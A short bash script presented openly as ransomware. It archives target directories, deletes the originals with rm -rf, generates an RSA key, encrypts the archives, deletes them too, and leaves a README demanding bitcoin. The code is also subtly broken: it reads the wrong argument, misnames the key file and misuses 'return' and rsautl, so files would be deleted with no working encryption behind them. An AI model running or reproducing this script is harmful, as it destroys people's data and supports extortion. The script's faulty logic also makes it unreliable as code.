#!/bin/bash
# Usage: ./script.sh /path/to/ransomware
echo -n "Are you sure you want to ransom this machine? It will delete files. (y/n)? "
read answer
if [ "$answer" != "${answer#[Yy]}" ] ;then # this grammar (the #[] operator) means that the variable $answer where any Y or y in 1st position will be dropped if they exist.
    echo Yes
else
    echo No
    return
fi
cd $2
for d in $2
do
    tar -czf ransom-$d.tar.gz $d
    rm -rf $d
done
openssl genrsa -aes256 -out ransome-private.pem
openssl rsa -in ransom-private.pem -pubout > public.pem
cp public.pem key.pem
for d in $2/ransom-*.tar.gz
do
    openssl rsautl -encrypt -inkey key.pem -pubin -in $d -out $(basename "${d%.*}")
    rm -rf $d
done
echo "You've been hacked! Send your moneyz to btc:abc123xyz..." > README.md